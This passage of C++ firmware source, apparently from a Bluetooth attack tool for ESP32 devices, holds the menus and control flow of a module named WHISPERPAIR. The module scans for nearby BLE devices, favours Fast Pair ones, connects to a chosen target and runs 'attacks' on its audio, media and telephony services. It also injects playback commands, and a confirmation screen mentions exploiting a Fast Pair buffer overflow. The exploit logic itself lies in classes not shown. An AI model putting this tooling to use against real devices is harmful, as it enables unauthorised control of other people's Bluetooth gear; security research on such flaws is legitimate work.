                selectedTest = (selectedTest > 0) ? selectedTest - 1 : AUDIO_TESTS - 1;
                inputProcessed = true;
            }
            else if(check(NextPress)) {
                delay(150);
                selectedTest = (selectedTest + 1) % AUDIO_TESTS;
                inputProcessed = true;
            }
            else if(check(SelPress)) {
                delay(200);
                executeAudioTest(selectedTest, target);
                exitSubmenu = true;
                inputProcessed = true;
            }
            
            if(!inputProcessed) {
                delay(50);
            }
        }
    }
}

void audioCommandHijackTest() {
    tft.fillScreen(bruceConfig.bgColor);
    tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setTextSize(2);
    tft.setCursor((tftWidth - strlen("AUDIO HIJACK") * 12) / 2, 15);
    tft.print("AUDIO HIJACK");
    tft.setTextSize(1);
    
    tft.setCursor(20, 60);
    tft.print("1. Start audio service");
    tft.setCursor(20, 90);
    tft.print("2. Connect target device");
    tft.setCursor(20, 120);
    tft.print("3. Inject audio commands");
    tft.setCursor(20, 160);
    tft.print("SEL: Start  ESC: Back");

    while(true) {
        if(check(EscPress)) {
            return;
        }
        if(check(SelPress)) {
            break;
        }
        delay(50);
    }

    showAdaptiveMessage("Starting audio service...", "", "", "", TFT_WHITE, false, true);
    AudioCommandService audioCmd;
    audioCmd.start();

    tft.fillScreen(bruceConfig.bgColor);
    tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setTextSize(2);
    tft.setCursor((tftWidth - strlen("AUDIO INJECTION") * 12) / 2, 15);
    tft.print("AUDIO INJECTION");
    tft.setTextSize(1);
    
    tft.setCursor(20, 60);
    tft.print("Service: RUNNING");
    tft.setCursor(20, 90);
    tft.print("Waiting for connection...");
    tft.setCursor(20, 120);
    tft.print("Connected: ");
    tft.setCursor(120, 120);
    if(audioCmd.isDeviceConnected()) {
        tft.print("YES");
    } else {
        tft.print("NO");
    }

    tft.setCursor(20, 160);
    tft.print("SEL: Inject  ESC: Stop");

    unsigned long startTime = millis();
    while(millis() - startTime < 30000) {
        if(check(EscPress)) {
            audioCmd.stop();
            showAdaptiveMessage("Service stopped", "OK", "", "", TFT_WHITE, true, false);
            return;
        }

        if(check(SelPress)) {
            if(audioCmd.isDeviceConnected()) {
                uint8_t volume_up[] = {0x01, 0x00, 0x00, 0x00};
                audioCmd.injectCommand(volume_up, 4);
                showAdaptiveMessage("Volume up sent!", "", "", "", TFT_GREEN, false, true);
                delay(500);

                uint8_t play_pause[] = {0x02, 0x00, 0x00, 0x00};
                audioCmd.injectCommand(play_pause, 4);
                showAdaptiveMessage("Play/Pause sent!", "", "", "", TFT_GREEN, false, true);
                delay(500);

                uint8_t next_track[] = {0x03, 0x00, 0x00, 0x00};
                audioCmd.injectCommand(next_track, 4);
                showAdaptiveMessage("Next track sent!", "", "", "", TFT_GREEN, false, true);
                delay(500);
            } else {
                showErrorMessage("No device connected!");
                delay(1000);
            }
        }
        delay(100);
    }

    audioCmd.stop();
    showAdaptiveMessage("Timeout - service stopped", "OK", "", "", TFT_WHITE, true, false);
}

void executeAudioTest(int testIndex, NimBLEAddress target) {
    AudioAttackService audioAttack;
    
    switch(testIndex) {
        case 0:
            showAttackProgress("Testing AVRCP service...", TFT_WHITE);
            {
                BLEAttackManager bleManager;
                bleManager.prepareForConnection();
                
                NimBLEClient* pClient = nullptr;
                if(bleManager.connectToDevice(target, &pClient)) {
                    if(pClient->discoverAttributes()) {
                        NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0x110E));
                        if(pService) {
                            audioAttack.attackAVRCP(pService);
                            showAttackResult(true, "AVRCP test completed");
                        } else {
                            showAttackResult(false, "No AVRCP service found");
                        }
                    }
                    
                    if(pClient->isConnected()) {
                        pClient->disconnect();
                    }
                }
                bleManager.cleanupAfterAttack();
            }
            break;
            
        case 1:
            showAttackProgress("Testing Media Control...", TFT_WHITE);
            {
                BLEAttackManager bleManager;
                bleManager.prepareForConnection();
                
                NimBLEClient* pClient = nullptr;
                if(bleManager.connectToDevice(target, &pClient)) {
                    if(pClient->discoverAttributes()) {
                        NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0x1843));
                        if(pService) {
                            audioAttack.attackAudioMedia(pService);
                            showAttackResult(true, "Media control test completed");
                        } else {
                            showAttackResult(false, "No Media service found");
                        }
                    }
                    
                    if(pClient->isConnected()) {
                        pClient->disconnect();
                    }
                }
                bleManager.cleanupAfterAttack();
            }
            break;
            
        case 2:
            showAttackProgress("Testing Telephony...", TFT_WHITE);
            {
                BLEAttackManager bleManager;
                bleManager.prepareForConnection();
                
                NimBLEClient* pClient = nullptr;
                if(bleManager.connectToDevice(target, &pClient)) {
                    if(pClient->discoverAttributes()) {
                        NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0x1124));
                        if(pService) {
                            audioAttack.attackTelephony(pService);
                            showAttackResult(true, "Telephony test completed");
                        } else {
                            showAttackResult(false, "No Telephony service found");
                        }
                    }
                    
                    if(pClient->isConnected()) {
                        pClient->disconnect();
                    }
                }
                bleManager.cleanupAfterAttack();
            }
            break;
            
        case 3:
            showAttackProgress("Testing all audio services...", TFT_WHITE);
            audioAttack.executeAudioAttack(target);
            showAttackResult(true, "Complete audio test done");
            break;
    }
}

void showAttackProgress(const char* message, uint16_t color) {
    tft.fillScreen(bruceConfig.bgColor);
    tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setTextSize(2);
    tft.setCursor((tftWidth - strlen("WHISPERPAIR") * 12) / 2, 15);
    tft.print("WHISPERPAIR");
    tft.setTextSize(1);
    
    tft.setTextColor(color, bruceConfig.bgColor);
    tft.setCursor(20, 80);
    tft.print(message);

    static uint8_t spinnerPos = 0;
    const char* spinner = "|/-\\";
    tft.setCursor(tftWidth - 40, 80);
    tft.print(spinner[spinnerPos % 4]);
    spinnerPos++;
}

void showAttackResult(bool success, const char* message) {
    if(success) {
        tft.fillScreen(TFT_GREEN);
        tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_BLACK);
        tft.setTextColor(TFT_WHITE, TFT_GREEN);
        tft.setTextSize(2);
        tft.setCursor((tftWidth - strlen("SUCCESS") * 12) / 2, 15);
        tft.print("SUCCESS");
        tft.setTextSize(1);
        tft.setTextColor(TFT_BLACK, TFT_GREEN);
    } else {
        tft.fillScreen(TFT_RED);
        tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_BLACK);
        tft.setTextColor(TFT_WHITE, TFT_RED);
        tft.setTextSize(2);
        tft.setCursor((tftWidth - strlen("FAILED") * 12) / 2, 15);
        tft.print("FAILED");
        tft.setTextSize(1);
        tft.setTextColor(TFT_WHITE, TFT_RED);
    }

    tft.setCursor(20, 80);
    if(message) {
        tft.print(message);
    } else {
        tft.print(success ? "Attack successful!" : "Attack failed");
    }

    tft.fillRoundRect(tftWidth/2 - 40, 150, 80, 35, 5, TFT_BLACK);
    tft.setTextColor(success ? TFT_GREEN : TFT_RED, TFT_BLACK);
    tft.setCursor(tftWidth/2 - 15, 157);
    tft.print("OK");

    tft.setTextColor(success ? TFT_BLACK : TFT_WHITE, success ? TFT_GREEN : TFT_RED);
    tft.setCursor(20, 200);
    tft.print("Press SEL to continue...");

    while(!check(SelPress)) {
        delay(50);
    }
    delay(200);
}

bool confirmAttack(const char* targetName) {
    tft.fillScreen(bruceConfig.bgColor);
    tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setTextSize(2);
    tft.setCursor((tftWidth - strlen("CONFIRM ATTACK") * 12) / 2, 15);
    tft.print("CONFIRM ATTACK");
    tft.setTextSize(1);

    tft.setCursor(20, 60);
    tft.print("Target: ");
    tft.println(targetName);

    tft.setCursor(20, 90);
    tft.println("This will attempt to exploit");
    tft.setCursor(20, 110);
    tft.println("FastPair buffer overflow.");

    tft.setCursor(20, 140);
    tft.println("Use only on test devices!");

    tft.fillRect(20, 170, tftWidth - 40, 60, bruceConfig.bgColor);

    tft.fillRoundRect(50, 175, 80, 35, 5, TFT_GREEN);
    tft.setTextColor(TFT_BLACK, TFT_GREEN);
    tft.setCursor(65, 182);
    tft.print("YES");

    tft.fillRoundRect(150, 175, 80, 35, 5, TFT_RED);
    tft.setTextColor(TFT_WHITE, TFT_RED);
    tft.setCursor(170, 182);
    tft.print("NO");

    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setCursor(20, 230);
    tft.print("SEL: Yes  NEXT: No  ESC: Cancel");

    while(true) {
        if(check(EscPress)) {
            return false;
        }
        if(check(SelPress)) {
            return true;
        }
        if(check(NextPress)) {
            return false;
        }
        delay(50);
    }
}

void clearMenu() {
    tft.fillScreen(bruceConfig.bgColor);
}

String selectTargetFromScan(const char* title) {
    String selectedMAC = "";
    uint8_t selectedAddrType = BLE_ADDR_PUBLIC;

    tft.fillScreen(bruceConfig.bgColor);
    tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setTextSize(2);
    tft.setCursor((tftWidth - strlen(title) * 12) / 2, 15);
    tft.print(title);
    tft.setTextSize(1);
    
    tft.fillRect(20, 60, tftWidth - 40, 40, bruceConfig.bgColor);
    tft.setCursor(20, 60);
    tft.print("Initializing scanner...");

    NimBLEDevice::deinit(true);
    delay(100);
    NimBLEDevice::init("Bruce-Scanner");
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
    NimBLEDevice::setSecurityAuth(false, false, false);

    NimBLEScan* pBLEScan = NimBLEDevice::getScan();
    if(!pBLEScan) {
        showErrorMessage("Failed to create scanner");
        return "";
    }

    pBLEScan->clearResults();
    pBLEScan->setActiveScan(true);
    pBLEScan->setInterval(67);
    pBLEScan->setWindow(33);
    pBLEScan->setDuplicateFilter(true);

    tft.fillRect(20, 60, tftWidth - 40, 40, bruceConfig.bgColor);
    tft.setCursor(20, 60);
    tft.print("Scanning for 15s...");

    unsigned long scanStart = millis();
    pBLEScan->start(0, true);

    struct ScanDevice {
        String name;
        String address;
        uint8_t addrType;
        int rssi;
        bool fastPair;
    };
    std::vector<ScanDevice> devices;

    while (millis() - scanStart < 15000) {
        if (check(EscPress)) {
            pBLEScan->stop();
            return "";
        }
        delay(10);
    }

    pBLEScan->stop();
    NimBLEScanResults foundDevices = pBLEScan->getResults();

    for(int i = 0; i < foundDevices.getCount(); i++) {
        const NimBLEAdvertisedDevice* device = foundDevices.getDevice(i);
        if(!device) continue;

        ScanDevice dev;
        std::string nameStdStr = device->getName();
        dev.name = String(nameStdStr.c_str());
        std::string addrStdStr = device->getAddress().toString();
        dev.address = String(addrStdStr.c_str());
        dev.addrType = device->getAddressType();
        dev.rssi = device->getRSSI();
        dev.fastPair = false;

        if(dev.name.isEmpty() || dev.name == "(null)") {
            dev.name = dev.address;
        }

        if(device->haveManufacturerData()) {
            std::string mfg = device->getManufacturerData();
            if(mfg.length() >= 2) {
                uint16_t mfg_id = (mfg[1] << 8) | mfg[0];
                if(mfg_id == 0x00E0 || mfg_id == 0x2C00) {
                    dev.fastPair = true;
                }
            }
        }

        devices.push_back(dev);
    }

    pBLEScan->clearResults();

    if(devices.empty()) {
        showWarningMessage("NO DEVICES FOUND");
        delay(1500);
        return "";
    }

    std::sort(devices.begin(), devices.end(), [](const ScanDevice& a, const ScanDevice& b) {
        if(a.fastPair != b.fastPair) return a.fastPair;
        return a.rssi > b.rssi;
    });

    const int maxDevices = std::min((int)devices.size(), 6);
    int selectedIdx = 0;
    bool exitLoop = false;

    while(!exitLoop) {
        tft.fillScreen(bruceConfig.bgColor);
        tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setTextSize(2);
        tft.setCursor((tftWidth - strlen("SELECT DEVICE") * 12) / 2, 15);
        tft.print("SELECT DEVICE");
        tft.setTextSize(1);
        
        int yPos = 60;

        for(int i = 0; i < maxDevices; i++) {
            const auto& dev = devices[i];
            String displayText = dev.name;
            if(displayText.length() > 18) {
                displayText = displayText.substring(0, 15) + "...";
            }
            displayText += " (" + String(dev.rssi) + "dB)";
            if(dev.fastPair) displayText += " [FP]";

            if(i == selectedIdx) {
                tft.fillRect(20, yPos, tftWidth - 40, 22, TFT_WHITE);
                tft.setTextColor(TFT_BLACK, TFT_WHITE);
            } else {
                tft.fillRect(20, yPos, tftWidth - 40, 22, bruceConfig.bgColor);
                tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
            }

            tft.setCursor(25, yPos + 6);
            tft.print(displayText);
            yPos += 24;
        }

        tft.setCursor(20, yPos + 10);
        tft.print("UP/DOWN: Select  SEL: Connect  ESC: Back");

        unsigned long inputWaitStart = millis();
        bool gotInput = false;

        while(!gotInput && millis() - inputWaitStart < 30000) {
            if(check(PrevPress)) {
                if(selectedIdx > 0) selectedIdx--;
                gotInput = true;
                delay(200);
            }
            else if(check(NextPress)) {
                if(selectedIdx < maxDevices - 1) selectedIdx++;
                gotInput = true;
                delay(200);
            }
            else if(check(SelPress)) {
                tft.fillRect(20, yPos + 40, tftWidth - 40, 30, bruceConfig.bgColor);
                tft.setCursor(20, yPos + 40);
                tft.print("Connecting...");
                delay(500);
                selectedMAC = devices[selectedIdx].address;
                selectedAddrType = devices[selectedIdx].addrType;
                exitLoop = true;
                gotInput = true;
            }
            else if(check(EscPress)) {
                exitLoop = true;
                gotInput = true;
            }
            if(!gotInput) delay(10);
        }

        if(millis() - inputWaitStart >= 30000) {
            showWarningMessage("Selection timeout");
            break;
        }
    }

    if (!selectedMAC.isEmpty()) {
        return selectedMAC + ":" + String(selectedAddrType);
    }
    return "";
}

NimBLEAddress parseAddress(const String& addressInfo) {
    int colonPos = addressInfo.lastIndexOf(':');
    if(colonPos == -1) {
        return NimBLEAddress();
    }
    String mac = addressInfo.substring(0, colonPos);
    uint8_t type = addressInfo.substring(colonPos + 1).toInt();
    return NimBLEAddress(mac.c_str(), type);
}

bool requireSimpleConfirmation(const char* message) {
    tft.fillScreen(bruceConfig.bgColor);
    tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setTextSize(2);
    tft.setCursor((tftWidth - strlen("CONFIRM") * 12) / 2, 15);
    tft.print("CONFIRM");
    tft.setTextSize(1);
    
    tft.fillRect(20, 50, tftWidth - 40, 100, bruceConfig.bgColor);
    tft.setCursor(20, 60);
    String msgStr = message;
    if(msgStr.length() > 30) {
        tft.print(msgStr.substring(0, 30));
        tft.setCursor(20, 85);
        if(msgStr.length() > 60) {
            tft.print(msgStr.substring(30, 60) + "...");
        } else {
            tft.print(msgStr.substring(30));
        }
    } else {
        tft.print(message);
    }
    while(true) {
        if(check(EscPress)) {
            showAdaptiveMessage("Cancelled", "OK", "", "", TFT_WHITE, true, false);
            return false;
        }
        if(check(SelPress)) {
            showAdaptiveMessage("Confirmed!", "OK", "", "", TFT_WHITE, true, false);
            delay(300);
            return true;
        }
        delay(50);
    }
}

int8_t showAdaptiveMessage(const char* line1, const char* btn1, const char* btn2, const char* btn3, uint16_t color, bool showEscHint, bool autoProgress) {
    int buttonCount = 0;
    if(strlen(btn1) > 0) buttonCount++;
    if(strlen(btn2) > 0) buttonCount++;
    if(strlen(btn3) > 0) buttonCount++;
    if(buttonCount == 0 && autoProgress) {
        tft.fillScreen(bruceConfig.bgColor);
        tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setTextSize(2);
        tft.setCursor((tftWidth - strlen("MESSAGE") * 12) / 2, 15);
        tft.print("MESSAGE");
        tft.setTextSize(1);
        
        tft.setTextColor(color, bruceConfig.bgColor);
        tft.setCursor(20, 70);
        String lineStr = line1;
        if(lineStr.length() > 30) {
            tft.print(lineStr.substring(0, 30));
            tft.setCursor(20, 95);
            if(lineStr.length() > 60) {
                tft.print(lineStr.substring(30, 60) + "...");
            } else {
                tft.print(lineStr.substring(30));
            }
        } else {
            tft.print(line1);
        }
        delay(1500);
        return 0;
    }
    if(buttonCount == 0) {
        tft.fillScreen(bruceConfig.bgColor);
        tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setTextSize(2);
        tft.setCursor((tftWidth - strlen("MESSAGE") * 12) / 2, 15);
        tft.print("MESSAGE");
        tft.setTextSize(1);
        
        tft.fillRect(20, 60, tftWidth - 40, 100, bruceConfig.bgColor);
        tft.setTextColor(color, bruceConfig.bgColor);
        tft.setCursor(20, 70);
        String lineStr = line1;
        if(lineStr.length() > 30) {
            tft.print(lineStr.substring(0, 30));
            tft.setCursor(20, 95);
            if(lineStr.length() > 60) {
                tft.print(lineStr.substring(30, 60) + "...");
            } else {
                tft.print(lineStr.substring(30));
            }
        } else {
            tft.print(line1);
        }
        tft.setCursor(20, 140);
        tft.print("Press any key to continue...");
        while(true) {
            if(check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
                delay(200);
                return 0;
            }
            delay(50);
        }
    }
    else if(buttonCount == 1) {
        const char* buttons[] = {btn1, btn2, btn3};
        const char* actualBtn = "";
        for(int i = 0; i < 3; i++) {
            if(strlen(buttons[i]) > 0) {
                actualBtn = buttons[i];
                break;
            }
        }
        tft.fillScreen(bruceConfig.bgColor);
        tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setTextSize(2);
        tft.setCursor((tftWidth - strlen("MESSAGE") * 12) / 2, 15);
        tft.print("MESSAGE");
        tft.setTextSize(1);
        
        tft.fillRect(20, 60, tftWidth - 40, 60, bruceConfig.bgColor);
        tft.setTextColor(color, bruceConfig.bgColor);
        tft.setCursor(20, 70);
        String lineStr = line1;
        if(lineStr.length() > 30) {
            tft.print(lineStr.substring(0, 30));
            if(lineStr.length() > 60) {
                tft.setCursor(20, 95);
                tft.print(lineStr.substring(30, 60) + "...");
            }
        } else {
            tft.print(line1);
        }
        String btnText = actualBtn;
        if(btnText.length() > 12) {
            btnText = btnText.substring(0, 9) + "...";
        }
        int btnWidth = btnText.length() * 12 + 20;
        if(btnWidth < 100) btnWidth = 100;
        int btnX = (tftWidth - btnWidth) / 2;
        int btnY = 150;
        tft.fillRoundRect(btnX, btnY, btnWidth, 35, 5, bruceConfig.priColor);
        tft.setTextColor(TFT_WHITE, bruceConfig.priColor);
        int textWidth = btnText.length() * 6;
        int textX = btnX + (btnWidth - textWidth) / 2;
        tft.setCursor(textX, btnY + 12);
        tft.print(btnText);
        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setCursor(20, 200);
        tft.print("SEL: Select  ESC: Cancel");
        while(true) {
            if(check(EscPress)) {
                delay(200);
                return -1;
            }
            if(check(SelPress)) {
                delay(200);
                return 0;
            }
            delay(50);
        }
    }
    else {
        tft.fillScreen(bruceConfig.bgColor);
        tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setTextSize(2);
        tft.setCursor((tftWidth - strlen("SELECT") * 12) / 2, 15);
        tft.print("SELECT");
        tft.setTextSize(1);
        
        tft.setTextColor(color, bruceConfig.bgColor);
        tft.setCursor(20, 70);
        tft.print(line1);

        int btnWidth = 80;
        int btnHeight = 35;
        int btnY = 150;
        int8_t result = -2;

        if(strlen(btn1) > 0) {
            tft.fillRoundRect(50, btnY, btnWidth, btnHeight, 5, bruceConfig.priColor);
            tft.setTextColor(TFT_WHITE, bruceConfig.priColor);
            tft.setCursor(60, btnY + 12);
            String btn1Str = btn1;
            if(btn1Str.length() > 8) btn1Str = btn1Str.substring(0, 5) + "...";
            tft.print(btn1Str);
        }

        if(strlen(btn2) > 0) {
            tft.fillRoundRect(150, btnY, btnWidth, btnHeight, 5, bruceConfig.secColor);
            tft.setTextColor(TFT_WHITE, bruceConfig.secColor);
            tft.setCursor(160, btnY + 12);
            String btn2Str = btn2;
            if(btn2Str.length() > 8) btn2Str = btn2Str.substring(0, 5) + "...";
            tft.print(btn2Str);
        }

        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setCursor(20, 200);
        if(strlen(btn3) > 0) {
            tft.print("SEL: Btn1  NEXT: Btn2  ESC: Cancel");
        } else {
            tft.print("SEL: Btn1  NEXT: Btn2  ESC: Back");
        }

        while(true) {
            if(check(EscPress)) {
                delay(200);
                return -1;
            }
            if(check(SelPress)) {
                delay(200);
                return 0;
            }
            if(check(NextPress)) {
                delay(200);
                return 1;
            }
            if(strlen(btn3) > 0 && check(PrevPress)) {
                delay(200);
                return 2;
            }
            delay(50);
        }
    }
}

void showWarningMessage(const char* message) {
    tft.fillScreen(TFT_YELLOW);
    tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_BLACK);
    tft.setTextColor(TFT_WHITE, TFT_YELLOW);
    tft.setTextSize(2);
    tft.setCursor((tftWidth - strlen("WARNING") * 12) / 2, 15);
    tft.print("WARNING");
    tft.setTextSize(1);
    
    tft.setTextColor(TFT_BLACK, TFT_YELLOW);
    tft.fillRect(20, 60, tftWidth - 40, 100, TFT_YELLOW);
    tft.setCursor(20, 70);
    String msgStr = message;
    if(msgStr.length() > 30) {
        tft.print(msgStr.substring(0, 30));
        tft.setCursor(20, 95);
        if(msgStr.length() > 60) {
            tft.print(msgStr.substring(30, 60) + "...");
        } else {
            tft.print(msgStr.substring(30));
        }
    } else {
        tft.print(message);
    }
    tft.setCursor(20, 140);
    tft.print("Press any key to continue...");
    while(true) {
        if(check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
            delay(200);
            return;
        }
        delay(50);
    }
}

void showErrorMessage(const char* message) {
    tft.fillScreen(TFT_RED);
    tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_BLACK);
    tft.setTextColor(TFT_WHITE, TFT_RED);
    tft.setTextSize(2);
    tft.setCursor((tftWidth - strlen("ERROR") * 12) / 2, 15);
    tft.print("ERROR");
    tft.setTextSize(1);
    
    tft.setTextColor(TFT_WHITE, TFT_RED);
    tft.fillRect(20, 60, tftWidth - 40, 100, TFT_RED);
    tft.setCursor(20, 70);
    String msgStr = message;
    if(msgStr.length() > 30) {
        tft.print(msgStr.substring(0, 30));
        tft.setCursor(20, 95);
        if(msgStr.length() > 60) {
            tft.print(msgStr.substring(30, 60) + "...");
        } else {
            tft.print(msgStr.substring(30));
        }
    } else {
        tft.print(message);
    }
    tft.setCursor(20, 140);
    tft.print("Press any key to continue...");
    while(true) {
        if(check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
            delay(200);
            return;
        }
        delay(50);
    }
}

void showSuccessMessage(const char* message) {
    tft.fillScreen(TFT_GREEN);
    tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_BLACK);
    tft.setTextColor(TFT_WHITE, TFT_GREEN);
    tft.setTextSize(2);
    tft.setCursor((tftWidth - strlen("SUCCESS") * 12) / 2, 15);
    tft.print("SUCCESS");
    tft.setTextSize(1);
    
    tft.setTextColor(TFT_BLACK, TFT_GREEN);
    tft.fillRect(20, 60, tftWidth - 40, 100, TFT_GREEN);
    tft.setCursor(20, 70);
    String msgStr = message;
    if(msgStr.length() > 30) {
        tft.print(msgStr.substring(0, 30));
        tft.setCursor(20, 95);
        if(msgStr.length() > 60) {
            tft.print(msgStr.substring(30, 60) + "...");
        } else {
            tft.print(msgStr.substring(30));
        }
    } else {
        tft.print(message);
    }
    tft.setCursor(20, 140);
    tft.print("Press any key to continue...");
    while(true) {
        if(check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
            delay(200);
            return;
        }
        delay(50);
    }
}

void showDeviceInfoScreen(const char* title, const std::vector<String>& lines, uint16_t bgColor, uint16_t textColor) {
    tft.fillScreen(bgColor);
    tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
    tft.setTextColor(TFT_WHITE, bgColor);
    tft.setTextSize(2);
    tft.setCursor((tftWidth - strlen(title) * 12) / 2, 15);
    tft.print(title);
    tft.setTextSize(1);
    
    tft.setTextColor(textColor, bgColor);
    int yPos = 60;
    int lineHeight = 20;
    int maxLines = 8;
    for(int i = 0; i < std::min((int)lines.size(), maxLines); i++) {
        tft.setCursor(20, yPos);
        String displayLine = lines[i];
        if(displayLine.length() > 35) {
            displayLine = displayLine.substring(0, 32) + "...";
        }
        tft.print(displayLine);
        yPos += lineHeight;
    }
    tft.setCursor(20, 220);
    tft.print("Press any key to continue...");
    while(true) {
        if(check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
            delay(200);
            return;
        }
        delay(50);
    }
}